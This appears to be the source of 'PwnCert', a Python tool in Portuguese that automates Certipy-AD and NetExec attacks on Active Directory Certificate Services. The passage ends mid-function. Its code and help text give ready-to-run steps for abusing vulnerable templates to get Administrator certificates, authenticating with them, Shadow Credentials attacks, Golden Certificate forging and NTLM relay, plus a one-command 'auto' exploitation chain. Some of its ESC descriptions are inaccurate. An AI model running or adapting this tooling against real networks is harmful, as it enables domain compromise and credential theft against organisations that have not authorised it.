#!/usr/bin/env python3
"""
PwnCert - Certipy-AD Automation Tool
Automatiza comandos do Certipy-AD para AD CS enumeration e exploitation
Uso: python pwncert.py --help
"""

import subprocess
import argparse
import sys
import os
import json
import re
from typing import List, Dict, Optional, Tuple
from auto_exploit import AutoExploit, VulnerabilityDetector


def update_from_git():
    """Atualiza a ferramenta direto do repositório Git"""
    try:
        print("[*] Atualizando PwnCert do repositório Git...")
        
        # Verifica se está em um repositório git
        result = subprocess.run(
            ['git', 'rev-parse', '--git-dir'],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            print("[!] Erro: Não está em um repositório Git")
            return False
        
        # Faz o fetch das mudanças
        print("[*] Buscando mudanças do repositório remoto...")
        subprocess.run(['git', 'fetch'], check=True)
        
        # Faz o rebase/merge com a branch atual
        print("[*] Aplicando atualizações...")
        result = subprocess.run(
            ['git', 'pull', '--rebase'],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            print("[+] PwnCert atualizado com sucesso!")
            print("[*] Reinicie a ferramenta para usar a versão atualizada.")
            return True
        else:
            print("[!] Erro ao atualizar: {}".format(result.stderr))
            return False
            
    except FileNotFoundError:
        print("[!] Erro: Git não está instalado. Instale o Git para usar esta funcionalidade.")
        return False
    except Exception as e:
        print("[!] Erro ao atualizar: {}".format(str(e)))
        return False


def print_banner():
    """Exibe o banner da ferramenta"""
    banner = """
====================================================================
                                                                    
   PwnCert - Certipy-AD Automation Tool                            
                                                                    
   Active Directory Certificate Services                           
   Exploitation Automation                                         
                                                                    
   [+] Powered by Certipy-AD                                       
   [+] ESC1-ESC16 Support                                          
   [+] Author: 0x13-ByteZer0                                       
                                                                    
====================================================================
    """
    print(banner)


class CertAnalyzer:
    """Analisador inteligente de templates de certificado vulneráveis"""
    
    def __init__(self, debug: bool = False):
        self.debug = debug
        self.esc_patterns = {
            'ESC1': {'keywords': ['User', 'SubjectAltName'], 'dangerous': True},
            'ESC2': {'keywords': ['Enroll', 'Authenticated'], 'dangerous': True},
            'ESC3': {'keywords': ['RequestAgent', 'signing'], 'dangerous': True},
            'ESC4': {'keywords': ['Owner', 'Write'], 'dangerous': True},
            'ESC9': {'keywords': ['Managed', 'Service', 'Account'], 'dangerous': True},
            'ESC10': {'keywords': ['SAN', 'Certificate', 'Authority'], 'dangerous': True},
        }
    
    def parse_nxc_output(self, output: str) -> Dict:
        """Analisa output do NetExec para templates vulneráveis
        
        Args:
            output: Output do NetExec
            
        Returns:
            Dicionário com templates vulneráveis encontrados
        """
        results = {
            'vulnerable_templates': [],
            'cas': [],
            'enabled_templates': [],
            'raw_data': output
        }
        
        # Procura por padrões de templates
        template_pattern = r"Template:\s*([^\n]+)|template[:\s]+([^\n]+)"
        ca_pattern = r"CA:\s*([^\n]+)|ca[:\s]+([^\n]+)"
        
        for match in re.finditer(template_pattern, output, re.IGNORECASE):
            template = match.group(1) or match.group(2)
            if template and template not in results['vulnerable_templates']:
                results['vulnerable_templates'].append(template.strip())
        
        for match in re.finditer(ca_pattern, output, re.IGNORECASE):
            ca = match.group(1) or match.group(2)
            if ca and ca not in results['cas']:
                results['cas'].append(ca.strip())
        
        return results
    
    def identify_vulnerability(self, template_info: str) -> Optional[str]:
        """Identifica qual ESC vulnerability é aplicável
        
        Args:
            template_info: Informação do template
            
        Returns:
            Tipo de ESC ou None
        """
        template_lower = template_info.lower()
        
        for esc_type, patterns in self.esc_patterns.items():
            for keyword in patterns['keywords']:
                if keyword.lower() in template_lower:
                    return esc_type
        
        return None


class AutoExploiter:
    """Explorador automático de vulnerabilidades AD CS"""
    
    def __init__(self, pwncert_instance, debug: bool = False):
        self.pwncert = pwncert_instance
        self.debug = debug
        self.analyzer = CertAnalyzer(debug)
    
    def run_nxc_scan(self, target: str, username: str, password: str) -> Dict:
        """Executa scan NetExec para encontrar templates
        
        Args:
            target: IP/hostname do target
            username: Username
            password: Password
            
        Returns:
            Dicionário com resultados
        """
        print(f"\n[*] Executando NetExec scan em {target}...")
        
        cmd = [
            'nxc', 'ldap', target,
            '-u', username,
            '-p', password,
            '-M', 'certipy-find'
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                print("[+] NetExec scan concluído com sucesso")
                analysis = self.analyzer.parse_nxc_output(result.stdout + result.stderr)
                return analysis
            else:
                print(f"[!] Erro no NetExec: {result.stderr}")
                return {'vulnerable_templates': [], 'cas': []}
                
        except FileNotFoundError:
            print("[!] Erro: NetExec (nxc) não está instalado")
            print("[*] Instale com: pip install netexec")
            return {'vulnerable_templates': [], 'cas': []}
        except subprocess.TimeoutExpired:
            print("[!] Erro: NetExec timeout")
            return {'vulnerable_templates': [], 'cas': []}
        except Exception as e:
            print(f"[!] Erro ao executar NetExec: {str(e)}")
            return {'vulnerable_templates': [], 'cas': []}
    
    def auto_exploit(self, target: str, username: str, password: str, 
                     domain: str, dc_ip: str = None, output_dir: str = 'certipy_auto') -> bool:
        """Exploração automática completa
        
        Args:
            target: IP/hostname do AD CS
            username: Username
            password: Password
            domain: Domínio
            dc_ip: IP do DC (opcional)
            output_dir: Diretório de saída
            
        Returns:
            True se sucesso, False caso contrário
        """
        os.makedirs(output_dir, exist_ok=True)
        
        print("\n" + "="*70)
        print("[+] INICIANDO EXPLORAÇÃO AUTOMÁTICA AD CS")
        print("="*70)
        
        # Step 1: Executar NetExec
        print("\n[STEP 1] Buscando templates vulneráveis com NetExec...")
        nxc_results = self.run_nxc_scan(target, username, password)
        
        if not nxc_results['cas']:
            print("[!] Nenhuma CA encontrada. Tentando enumeration direto...")
            ret = self.pwncert.find(
                output=f"{output_dir}/enumeration",
                vulnerable=True,
                enabled=True,
                json=True
            )
            if ret != 0:
                print("[!] Falha na enumeração")
                return False
        
        # Step 2: Enumerar templates
        print("\n[STEP 2] Enumerando templates vulneráveis...")
        ret = self.pwncert.find(
            output=f"{output_dir}/templates",
            vulnerable=True,
            enabled=True,
            json=True
        )
        
        if ret != 0:
            print("[!] Falha na enumeração de templates")
            return False
        
        # Carregar resultados
        enum_file = f"{output_dir}/templates.json"
        if os.path.exists(enum_file):
            try:
                with open(enum_file, 'r') as f:
                    enum_data = json.load(f)
                    print(f"[+] {len(enum_data)} templates encontrados")
            except:
                enum_data = {}
        else:
            enum_data = {}
        
        if not enum_data:
            print("[!] Nenhum template vulnerável encontrado")
            return False
        
        # Step 3: Explorar templates
        print("\n[STEP 3] Testando exploração de templates...")
        success_count = 0
        
        for ca_name, templates in enum_data.items():
            if isinstance(templates, dict):
                template_names = list(templates.keys())
            else:
                template_names = [templates] if templates else []
            
            for template in template_names[:3]:  # Limitar a 3 tentativas
                print(f"\n[*] Testando CA: {ca_name}, Template: {template}")
                
                # Requisitar certificado
                cert_output = f"{output_dir}/{username}_{ca_name}_{template}"
                ret = self.pwncert.req(
                    ca=ca_name,
                    template=template,
                    alt=username,
                    output=cert_output
                )
                
                if ret == 0:
                    pfx_file = f"{cert_output}.pfx"
                    if os.path.exists(pfx_file):
                        print(f"[+] Certificado obtido: {pfx_file}")
                        
                        # Step 4: Autenticar com certificado
                        print(f"[*] Autenticando com certificado...")
                        auth_ret = self.pwncert.auth(
                            pfx=pfx_file,
                            domain=domain,
                            dc_ip=dc_ip,
                            username=username,
                            kirbi=False
                        )
                        
                        if auth_ret == 0:
                            print("[+] ✓ AUTENTICAÇÃO BEM-SUCEDIDA!")
                            print(f"[+] Certificado salvo em: {pfx_file}")
                            success_count += 1
                            break
        
        if success_count > 0:
            print("\n" + "="*70)
            print(f"[+] EXPLORAÇÃO CONCLUÍDA COM SUCESSO!")
            print(f"[+] {success_count} certificado(s) obtido(s)")
            print(f"[+] Arquivos salvos em: {output_dir}/")
            print("="*70)
            return True
        else:
            print("\n[!] Nenhuma exploração bem-sucedida")
            return False




class PwnCert:
    """Classe principal para automação do Certipy-AD
    
    Attributes:
        domain: Domínio Active Directory
        username: Nome de usuário para autenticação
        password: Senha (alternativa aos hashes)
        dc_ip: IP do Domain Controller
        hashes: Hashes NTLM (alternativa à senha)
        debug: Ativar modo debug
    """
    
    def __init__(self, domain: str, username: str, password: str = None, 
                 dc_ip: str = None, hashes: str = None, debug: bool = False) -> None:
        """Inicializa a classe PwnCert
        
        Args:
            domain: Domínio AD
            username: Username
            password: Password (opcional)
            dc_ip: IP do DC (opcional)
            hashes: Hashes NTLM (opcional)
            debug: Modo debug (padrão: False)
        """
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.hashes = hashes
        self.debug = debug
        self.base_auth = self._build_auth()
    
    def _build_auth(self) -> List[str]:
        """Constrói os parâmetros de autenticação base para todos os comandos
        
        Returns:
            Lista de parâmetros de autenticação
        """
        auth = []
        
        # Certipy usa -u username@domain, não -username e -domain separados
        if self.username and self.domain:
            auth.extend(['-u', f'{self.username}@{self.domain}'])
        
        if self.password:
            auth.extend(['-p', self.password])
        elif self.hashes:
            auth.extend(['-hashes', self.hashes])
        
        if self.dc_ip:
            auth.extend(['-dc-ip', self.dc_ip])
        
        if self.debug:
            auth.append('-debug')
        
        return auth
    
    def _run_command(self, cmd: List[str]) -> int:
        """Executa um comando do Certipy-AD
        
        Args:
            cmd: Lista de argumentos do comando
            
        Returns:
            Código de retorno do comando (0 = sucesso)
        """
        full_cmd = ['certipy-ad'] + cmd
        
        # Mostra o comando de forma legível
        cmd_display = []
        special_chars = ['@', '!', '#', '$', '&', ';', '|', '>', '<']
        for item in full_cmd:
            if ' ' in item or any(c in item for c in special_chars):
                cmd_display.append(f"'{item}'")
            else:
                cmd_display.append(item)
        
        if self.debug:
            print(f"\n[DEBUG] Executando: {' '.join(cmd_display)}")
        
        try:
            result = subprocess.run(full_cmd, capture_output=False, text=True, check=False)
            return result.returncode
        except FileNotFoundError:
            print("[!] Erro: 'certipy-ad' não encontrado. Verifique se Certipy-AD está instalado.")
            return 127
        except Exception as e:
            print(f"[!] Erro ao executar comando: {str(e)}")
            return 1
    
    def find(self, output: str = None, vulnerable: bool = False, 
             enabled: bool = False, stdout: bool = False, json: bool = False) -> int:
        """Encontra CAs e templates disponíveis
        
        Args:
            output: Arquivo de saída
            vulnerable: Mostrar apenas templates vulneráveis
            enabled: Mostrar apenas templates habilitados
            stdout: Exibir saída no console
            json: Formato de saída JSON
            
        Returns:
            Código de retorno do comando
        """
        cmd = ['find'] + self.base_auth
        
        if vulnerable:
            cmd.append('-vulnerable')
        if enabled:
            cmd.append('-enabled')
        if stdout:
            cmd.append('-stdout')
        if json:
            cmd.append('-json')
        
        output_file = output or 'certipy_find_results'
        cmd.extend(['-output', output_file])
        
        return self._run_command(cmd)
    
    def req(self, ca: str, template: str, alt: str = None, 
            upn: str = None, dns: str = None, subject: str = None,
            output: str = None) -> int:
        """Requisita um certificado a uma CA
        
        Args:
            ca: Nome da CA
            template: Nome do template de certificado
            alt: UPN alternativo
            upn: User Principal Name
            dns: Nome DNS
            subject: Subject do certificado
            output: Arquivo de saída
            
        Returns:
            Código de retorno do comando
        """
        if not ca or not template:
            print("[!] Erro: 'ca' e 'template' são obrigatórios")
            return 1
            
        cmd = ['req'] + self.base_auth + ['-ca', ca, '-template', template]
        
        if alt:
            cmd.extend(['-alt', alt])
        if upn:
            cmd.extend(['-upn', upn])
        if dns:
            cmd.extend(['-dns', dns])
        if subject:
            cmd.extend(['-subject', subject])
        if output:
            cmd.extend(['-output', output])
        
        return self._run_command(cmd)
    
    def auth(self, pfx: str, domain: str = None, dc_ip: str = None,
             username: str = None, kirbi: bool = False) -> int:
        """Autentica usando certificado PFX
        
        Args:
            pfx: Caminho do arquivo PFX
            domain: Domínio (sobrescreve config global)
            dc_ip: IP do Domain Controller (sobrescreve config global)
            username: Username para autenticação
            kirbi: Exportar ticket em formato kirbi
            
        Returns:
            Código de retorno do comando
        """
        if not pfx:
            print("[!] Erro: 'pfx' é obrigatório")
            return 1
            
        cmd = ['auth', '-pfx', pfx]
        
        # Adicionar credenciais se necessário (sem separar -u e domain)
        domain_to_use = domain or self.domain
        username_to_use = username or self.username
        
        if username_to_use and domain_to_use:
            cmd.extend(['-u', f'{username_to_use}@{domain_to_use}'])
        
        dc_ip_to_use = dc_ip or self.dc_ip
        if dc_ip_to_use:
            cmd.extend(['-dc-ip', dc_ip_to_use])
        
        if kirbi:
            cmd.append('-kirbi')
        
        return self._run_command(cmd)
    
    def shadow(self, account: str, device_id: str = None, 
               device_name: str = None, action: str = 'auto') -> int:
        """Shadow Credentials attack para comprometer conta
        
        Args:
            account: Conta alvo
            device_id: ID do dispositivo
            device_name: Nome do dispositivo
            action: Ação (auto, add, remove, list)
            
        Returns:
            Código de retorno do comando
        """
        if not account:
            print("[!] Erro: 'account' é obrigatório")
            return 1
            
        if action not in ['auto', 'add', 'remove', 'list']:
            print(f"[!] Erro: action deve ser 'auto', 'add', 'remove' ou 'list'")
            return 1
            
        cmd = ['shadow'] + self.base_auth + ['-account', account, '-action', action]
        
        if device_id:
            cmd.extend(['-device-id', device_id])
        if device_name:
            cmd.extend(['-device-name', device_name])
        
        return self._run_command(cmd)
    
    def forge(self, ca_pfx: str, upn: str, subject: str = None, 
              alt: str = None, output: str = None) -> int:
        """Forjar um certificado (Golden Certificate)
        
        Args:
            ca_pfx: Arquivo PFX da CA
            upn: UPN do certificado
            subject: Subject do certificado
            alt: Nome alternativo
            output: Arquivo de saída
            
        Returns:
            Código de retorno do comando
        """
        if not ca_pfx or not upn:
            print("[!] Erro: 'ca_pfx' e 'upn' são obrigatórios")
            return 1
            
        cmd = ['forge', '-ca-pfx', ca_pfx, '-upn', upn]
        
        if subject:
            cmd.extend(['-subject', subject])
        if alt:
            cmd.extend(['-alt', alt])
        if output:
            cmd.extend(['-output', output])
        
        return self._run_command(cmd)
    
    def relay(self, ca: str, template: str, target: str = None) -> int:
        """Fazer relay de NTLM para AD CS
        
        Args:
            ca: Nome da CA
            template: Nome do template
            target: Host alvo
            
        Returns:
            Código de retorno do comando
        """
        if not ca or not template:
            print("[!] Erro: 'ca' e 'template' são obrigatórios")
            return 1
            
        cmd = ['relay', '-ca', ca, '-template', template]
        
        if target:
            cmd.extend(['-target', target])
        
        return self._run_command(cmd)
    
    def cert(self, export: str = None, pfx: str = None, password: str = None,
             out: str = None, nocert: bool = False, nokey: bool = False) -> int:
        """Manipular certificados (exportar, converter, etc)
        
        Args:
            export: Caminho do certificado para exportar
            pfx: Arquivo PFX
            password: Senha do PFX
            out: Arquivo de saída
            nocert: Não exportar certificado
            nokey: Não exportar chave privada
            
        Returns:
            Código de retorno do comando
        """
        cmd = ['cert']
        
        if export:
            cmd.extend(['-export', export])
        if pfx:
            cmd.extend(['-pfx', pfx])
        if password:
            cmd.extend(['-password', password])
        if out:
            cmd.extend(['-out', out])
        if nocert:
            cmd.append('-nocert')
        if nokey:
            cmd.append('-nokey')
        
        return self._run_command(cmd)


def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='PwnCert - Certipy-AD Automation Tool - Automação Certipy-AD para AD CS enumeration e exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔════════════════════════════════════════════════════════════════════════════╗
║                            EXEMPLOS DE USO                                 ║
╚════════════════════════════════════════════════════════════════════════════╝

[1] ENUMERATION - Descobrir templates vulneráveis:
  # Encontrar todas as CAs e templates
  %(prog)s find -u admin -p Pass123 -d domain.local
  
  # Apenas templates vulneráveis
  %(prog)s find -u admin -p Pass123 -d domain.local --vulnerable
  
  # Apenas templates habilitados
  %(prog)s find -u admin -p Pass123 -d domain.local --enabled
  
  # Salvar resultado em JSON
  %(prog)s find -u admin -p Pass123 -d domain.local -v -j -o results.json
  
  # Com hash NTLM
  %(prog)s find -u admin -H 'LM:NT' -d domain.local --vulnerable

[2] REQUEST - Requisitar certificado (ESC1):
  # Template com alt UPN
  %(prog)s req -u admin -p Pass123 -d domain.local -ca CA-NAME -t VulnTemplate -a Administrator
  
  # Com especificação de UPN customizado
  %(prog)s req -u admin -p Pass123 -d domain.local -ca CA-NAME -t User --upn admin@domain.local
  
  # Com DNS alternativo
  %(prog)s req -u admin -p Pass123 -d domain.local -ca CA-NAME -t Template --dns dc.domain.local
  
  # Com subject customizado
  %(prog)s req -u admin -p Pass123 -d domain.local -ca CA-NAME -t Template --subject 'CN=Administrator'
  
  # Salvar com nome customizado
  %(prog)s req -u admin -p Pass123 -d domain.local -ca CA-NAME -t Template -a admin -o admin_cert

[3] AUTHENTICATION - Autenticar com certificado PFX:
  # Simples autenticação
  %(prog)s auth --pfx administrator.pfx -d domain.local
  
  # Gerar ticket kirbi
  %(prog)s auth --pfx administrator.pfx -d domain.local -k
  
  # Especificar DC diferente
  %(prog)s auth --pfx admin.pfx -d domain.local --dc-ip 192.168.1.10
  
  # Forçar username diferente
  %(prog)s auth --pfx cert.pfx -d domain.local --username-auth newadmin

[4] SHADOW CREDENTIALS - Shadow Credentials attack:
  # Ataque automático
  %(prog)s shadow -u admin -p Pass123 -d domain.local -a targetuser
  
  # Com device ID específico
  %(prog)s shadow -u admin -p Pass123 -d domain.local -a targetuser --device-id 123456
  
  # Adicionar credencial
  %(prog)s shadow -u admin -p Pass123 -d domain.local -a user --action add
  
  # Listar credenciais
  %(prog)s shadow -u admin -p Pass123 -d domain.local -a user --action list
  
  # Remover credencial
  %(prog)s shadow -u admin -p Pass123 -d domain.local -a user --action remove

[5] FORGE - Golden Certificate:
  # Forjar certificado dourado
  %(prog)s forge --ca-pfx ca.pfx --upn Administrator@domain.local
  
  # Com subject customizado
  %(prog)s forge --ca-pfx ca.pfx --upn admin@domain.local --subject 'CN=Administrator'
  
  # Com nome alternativo
  %(prog)s forge --ca-pfx ca.pfx --upn admin@domain.local --alt 'Administrator'
  
  # Salvar com nome específico
  %(prog)s forge --ca-pfx ca.pfx --upn admin@domain.local -o golden_cert

[6] RELAY - NTLM Relay para AD CS:
  # Relay básico
  %(prog)s relay -u admin -p Pass123 -d domain.local -ca CA-NAME -t Template
  
  # Com target específico
  %(prog)s relay -u admin -p Pass123 -d domain.local -ca CA-NAME -t Template --target printer.domain.local

[7] CERTIFICATE - Manipulação de certificados:
  # Exportar certificado de PFX
  %(prog)s cert -e admin.cer --pfx admin.pfx --password Pass123
  
  # Apenas chave privada
  %(prog)s cert --pfx admin.pfx --password Pass123 --nokey -o admin_key
  
  # Apenas certificado
  %(prog)s cert --pfx admin.pfx --password Pass123 --nocert -o admin_cert

[8] WORKFLOW - Automação completa:
  # Automação completa (enumerar, requisitar, autenticar)
  %(prog)s workflow -u admin -p Pass123 -d domain.local --target Administrator

[9] AUTO - Exploração TOTALMENTE AUTOMÁTICA (recomendado!):
  # Executa tudo automaticamente com NetExec
  %(prog)s auto -u admin -p Pass123 -d domain.local 192.168.1.100
  
  # Com target específico
  %(prog)s auto -u admin -p Pass123 -d domain.local --target Administrator 192.168.1.100
  
  # Com hash NTLM
  %(prog)s auto -u admin -H 'LM:NT' -d domain.local 192.168.1.100
  
  # Salvar log
  %(prog)s auto -u admin -p Pass123 -d domain.local --log exploit.log 192.168.1.100

[10] UPDATE - Atualizar ferramenta:
  # Atualizar do repositório Git
  %(prog)s --update

╔════════════════════════════════════════════════════════════════════════════╗
║                          OPÇÕES AVANÇADAS                                  ║
╚════════════════════════════════════════════════════════════════════════════╝

[DC Specification]
  --dc-ip 192.168.1.10         # Especificar Domain Controller
  
[Authentication Methods]
  -p 'Password123'              # Autentica com senha
  -H 'LM:NT'                    # Autentica com hash NTLM
  
[Output Formats]
  -o arquivo.txt                # Salvar em arquivo
  -s                            # Exibir no stdout
  -j                            # Formato JSON
  
[Debug]
  --debug                       # Modo debug (mostra comandos executados)
  
[Update]
  --update                      # Atualizar PwnCert do Git

╔════════════════════════════════════════════════════════════════════════════╗
║                          NOTAS IMPORTANTES                                  ║
╚════════════════════════════════════════════════════════════════════════════╝

1. CARACTERES ESPECIAIS:
   Use aspas simples ou duplas para valores com espaços ou caracteres especiais:
   • -u 'admin user'
   • -p 'Pass@123!'
   • -d 'corp.local'

2. HASHES NTLM:
   Formato: LM:NT (ex: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c)

3. TEMPLATES ESC VULNERÁVEIS:
   • ESC1: Autenticação no Subject Alternative Name (SAN)
   • ESC3: Requisição assinada pelo template
   • ESC9: No Managed Service Account
   • ESC10: Weakness em autorização

4. FORMATO PFX:
   Certificados devem estar em formato PKCS#12 (.pfx)

5. PERMISSÕES:
   • Certipy-AD precisa estar instalado: pip install certipy-ad
   • Permissões necessárias: EnrollOnBehalfOf para alguns ataques

╔════════════════════════════════════════════════════════════════════════════╗
║                          REQUISITOS                                         ║
╚════════════════════════════════════════════════════════════════════════════╝

• Python 3.6+
• Certipy-AD (pip install certipy-ad)
• Acesso de rede ao Active Directory
• Credenciais válidas do domínio ou hashes NTLM

        """
    )
    
    # Argumentos globais
    parser.add_argument('-u', '--username', required=False, help='Username')
    parser.add_argument('-p', '--password', required=False, help='Password')
    parser.add_argument('-H', '--hashes', help='NTLM hashes (LM:NT)')
    parser.add_argument('-d', '--domain', required=False, dest='domain', help='Domain')
    parser.add_argument('--dc-ip', help='IP do Domain Controller')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    parser.add_argument('--update', action='store_true', help='Atualizar a ferramenta direto do Git')
    
    # Subcomandos
    subparsers = parser.add_subparsers(dest='command', help='Comando a executar')
    
    # Find
    find_parser = subparsers.add_parser('find', help='Enumerar CAs e templates')
    find_parser.add_argument('-o', '--output', help='Arquivo de saída')
    find_parser.add_argument('-v', '--vulnerable', action='store_true', help='Apenas vulneráveis')
    find_parser.add_argument('-e', '--enabled', action='store_true', help='Apenas habilitados')
    find_parser.add_argument('-s', '--stdout', action='store_true', help='Output para stdout')
    find_parser.add_argument('-j', '--json', action='store_true', help='Formato JSON')
    
    # Request
    req_parser = subparsers.add_parser('req', help='Requisitar certificado')
    req_parser.add_argument('-ca', '--ca', required=True, help='Nome da CA')
    req_parser.add_argument('-t', '--template', required=True, help='Nome do template')
    req_parser.add_argument('-a', '--alt', help='Alternative UPN')
    req_parser.add_argument('--upn', help='User Principal Name')
    req_parser.add_argument('--dns', help='DNS Name')
    req_parser.add_argument('--subject', help='Subject')
    req_parser.add_argument('-o', '--output', help='Nome do arquivo de saída')
    
    # Auth
    auth_parser = subparsers.add_parser('auth', help='Autenticar com certificado')
    auth_parser.add_argument('--pfx', required=True, help='Arquivo PFX')
    auth_parser.add_argument('--domain', help='Domain (sobrescreve o global)')
    auth_parser.add_argument('--dc-ip-auth', dest='dc_ip_auth', help='DC IP (sobrescreve o global)')
    auth_parser.add_argument('--username-auth', dest='username_auth', help='Username (sobrescreve o global)')
    auth_parser.add_argument('-k', '--kirbi', action='store_true', help='Output em formato kirbi')
    
    # Shadow
    shadow_parser = subparsers.add_parser('shadow', help='Shadow Credentials attack')
    shadow_parser.add_argument('-a', '--account', required=True, help='Target account')
    shadow_parser.add_argument('--device-id', help='Device ID')
    shadow_parser.add_argument('--device-name', help='Device Name')
    shadow_parser.add_argument('--action', default='auto', choices=['auto', 'add', 'remove', 'list'], 
                               help='Action to perform')
    
    # Forge
    forge_parser = subparsers.add_parser('forge', help='Forge certificate (Golden Certificate)')
    forge_parser.add_argument('--ca-pfx', required=True, help='CA PFX file')
    forge_parser.add_argument('--upn', required=True, help='Target UPN')
    forge_parser.add_argument('--subject', help='Subject')
    forge_parser.add_argument('--alt', help='Alternative name')
    forge_parser.add_argument('-o', '--output', help='Output filename')
    
    # Relay
    relay_parser = subparsers.add_parser('relay', help='Relay NTLM to AD CS')
    relay_parser.add_argument('-ca', '--ca', required=True, help='CA name')
    relay_parser.add_argument('-t', '--template', required=True, help='Template name')
    relay_parser.add_argument('--target', help='Target host')
    
    # Cert
    cert_parser = subparsers.add_parser('cert', help='Certificate manipulation')
    cert_parser.add_argument('-e', '--export', help='Export from PFX')
    cert_parser.add_argument('--pfx', help='PFX file')
    cert_parser.add_argument('--password', help='PFX password')
    cert_parser.add_argument('--out', help='Output filename')
    cert_parser.add_argument('--nocert', action='store_true', help='Don\'t export certificate')
    cert_parser.add_argument('--nokey', action='store_true', help='Don\'t export private key')
    
    # Workflow
    workflow_parser = subparsers.add_parser('workflow', help='Automated workflow completo')
    workflow_parser.add_argument('--target', required=True, help='Target user para comprometer')
    workflow_parser.add_argument('-o', '--output', default='certipy_results', help='Diretório de saída')
    
    # Auto - Exploração automática com NetExec
    auto_parser = subparsers.add_parser('auto', help='Exploração TOTALMENTE AUTOMÁTICA (NetExec + Certipy)')
    auto_parser.add_argument('target', nargs='?', help='IP ou hostname do Domain Controller/LDAP')
    auto_parser.add_argument('--target-user', dest='target_user', default='Administrator', help='Usuário alvo (padrão: Administrator)')
    auto_parser.add_argument('--log', help='Arquivo para salvar log')
    
    # Parse inicial - pode haver argumentos globais após o subcomando
    args, remaining = parser.parse_known_args()
    
    # Se há argumentos restantes e o comando é 'auto', tenta reparsar reorganizando argumentos
    if remaining and args.command == 'auto':
        # Argumentos globais conhecidos
        global_arg_names = {'-u', '--username', '-p', '--password', '-H', '--hashes', '-d', '--domain', '--dc-ip', '--debug', '--update'}
        
        # Reconstrói sys.argv movendo argumentos globais para antes do comando
        auto_idx = next((i for i, x in enumerate(sys.argv) if x == 'auto'), -1)
        if auto_idx == -1:
            args = parser.parse_args()
        else:
            new_argv = [sys.argv[0]]
            args_before_auto = sys.argv[1:auto_idx]
            args_after_auto = sys.argv[auto_idx+1:]
            
            # Separa argumentos globais dos argumentos específicos do subcomando
            global_args_found = []
            subcommand_args = []
            i = 0
            while i < len(args_after_auto):
                arg = args_after_auto[i]
                if arg in global_arg_names:
                    global_args_found.append(arg)
                    # Se o argumento espera um valor (não é flag booleana)
                    if arg not in ['--debug', '--update']:
                        if i+1 < len(args_after_auto):
                            global_args_found.append(args_after_auto[i+1])
                            i += 1
                    i += 1
                else:
                    subcommand_args.append(arg)
                    i += 1
            
            # Reconstrói: args antes + args globais encontrados depois + auto + args do subcomando
            new_argv.extend(args_before_auto)
            new_argv.extend(global_args_found)
            new_argv.append('auto')
            new_argv.extend(subcommand_args)
            
            if args.debug:
                print(f"[DEBUG] Reorganizado: {' '.join(new_argv)}")
            
            args = parser.parse_args(new_argv[1:])
    else:
        args = parser.parse_args()
    
    # Verifica se foi solicitada atualização
    if args.update:
        return 0 if update_from_git() else 1
    
    if not args.command:
        parser.print_help()
        return 1
    
    # Validar argumentos obrigatórios para comandos normais
    if not args.username or not args.domain:
        print("\n[!] Erro: -u/--username e -d/--domain são obrigatórios")
        print("[*] Uso:")
        print("    python pwncert.py -u <username> -d <domain> [comando] [opções]")
        print("    python pwncert.py [comando] -u <username> -d <domain> [opções]")
        print("[*] Use --update para atualizar a ferramenta sem precisar destes argumentos")
        print("[*] Use --help para ver todos os comandos disponíveis\n")
        return 1
    
    # Validar autenticação
    if not args.password and not args.hashes:
        print("\n[!] Erro: Forneça -p/--password ou -H/--hashes para autenticação")
        print("[!] Exemplos:")
        print("    -p 'Password123'")
        print("    -H 'LM:NT'\n")
        return 1
    
    # Debug: mostrar parâmetros recebidos
    if args.debug:
        print("\n[DEBUG] Parâmetros recebidos:")
        print(f"  Username: {args.username}")
        print(f"  Domain: {args.domain}")
        print(f"  DC IP: {args.dc_ip or 'Auto'}")
        print(f"  Comando: {args.command}\n")
    
    # Criar instância
    pwncert = PwnCert(
        domain=args.domain,
        username=args.username,
        password=args.password,
        dc_ip=args.dc_ip,
        hashes=args.hashes,
        debug=args.debug
    )
    
    # Executar comando
    if args.command == 'find':
        return pwncert.find(
            output=args.output,
            vulnerable=args.vulnerable,
            enabled=args.enabled,
            stdout=args.stdout,
            json=args.json
        )
    
    elif args.command == 'req':
        return pwncert.req(
            ca=args.ca,
            template=args.template,
            alt=args.alt,
            upn=args.upn,
            dns=args.dns,
            subject=args.subject,
            output=args.output
        )
    
    elif args.command == 'auth':
        return pwncert.auth(
            pfx=args.pfx,
            domain=args.domain,
            dc_ip=args.dc_ip_auth,
            username=args.username_auth,
            kirbi=args.kirbi
        )
    
    elif args.command == 'shadow':
        return pwncert.shadow(
            account=args.account,
            device_id=args.device_id,
            device_name=args.device_name,
            action=args.action
        )
    
    elif args.command == 'forge':
        return pwncert.forge(
            ca_pfx=args.ca_pfx,
            upn=args.upn,
            subject=args.subject,
            alt=args.alt,
            output=args.output
        )
    
    elif args.command == 'relay':
        return pwncert.relay(
            ca=args.ca,
            template=args.template,
            target=args.target
        )
    
    elif args.command == 'cert':
        return pwncert.cert(
            export=args.export,
            pfx=args.pfx,
            password=args.password,
            out=args.out,
            nocert=args.nocert,
            nokey=args.nokey
        )
    
    elif args.command == 'workflow':
        print("\n[+] Iniciando PwnCert workflow automatizado de exploração AD CS")
        print(f"[+] Target: {args.target}")
        print(f"[+] Output: {args.output}")
        
        os.makedirs(args.output, exist_ok=True)
        
        # Step 1: Find vulnerable templates
        print("\n[STEP 1] Enumerando templates vulneráveis...")
        ret = pwncert.find(
            output=f"{args.output}/enumeration",
            vulnerable=True,
            enabled=True,
            json=True
        )
        
        if ret != 0:
            print("[!] Falha na enumeração")
            return ret
        
        print("\n[!] Analise os resultados em: {}/enumeration.json".format(args.output))
        print("[!] Para continuar o workflow, você precisa:")
        print("    1. Identificar uma CA e template vulnerável")
        print("    2. Executar: {} req -ca CA_NAME -t TEMPLATE -a {}".format(
            sys.argv[0], args.target))
        print("    3. Executar: {} auth --pfx {}.pfx".format(
            sys.argv[0], args.target))
        
        return 0
    
    elif args.command == 'auto':
        print("\n" + "="*80)
        print("  PwnCert AUTO - Exploração Totalmente Automática")
        print("="*80 + "\n")
        
        # Validações específicas para o comando auto
        if not args.username or not args.domain:
